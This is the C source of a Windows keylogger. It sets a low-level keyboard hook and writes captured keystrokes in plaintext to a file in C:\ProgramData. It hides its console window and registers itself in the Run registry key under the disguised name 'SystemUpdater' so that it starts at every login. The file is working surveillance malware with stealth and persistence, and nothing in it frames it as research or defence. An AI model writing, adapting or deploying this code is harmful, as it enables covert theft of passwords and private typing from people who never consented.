#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>  // For SHGetFolderPath
#include <winreg.h>

FILE *logfile;

// Keylogger Hook Callback (Plaintext Logging)
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = p->vkCode;

        if ((vkCode >= 0x30 && vkCode <= 0x5A) || vkCode == VK_SPACE) {
            fprintf(logfile, "%c", (char)vkCode);
            fflush(logfile);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Add to Startup via Windows Registry
void AddToStartup(const char *exePath) {
    HKEY hKey;
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "SystemUpdater", 0, REG_SZ, (BYTE *)exePath, strlen(exePath));
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    // Hide Console Window
    HWND stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);

    // Get log file path: C:\ProgramData\systemlog.txt
    char path[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
    strcat(path, "\\systemlog.txt");

    logfile = fopen(path, "a+");
    if (!logfile) return 1;

    // Add to Windows startup
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    AddToStartup(exePath);

    // Set hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) return 1;

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    fclose(logfile);
    return 0;
}
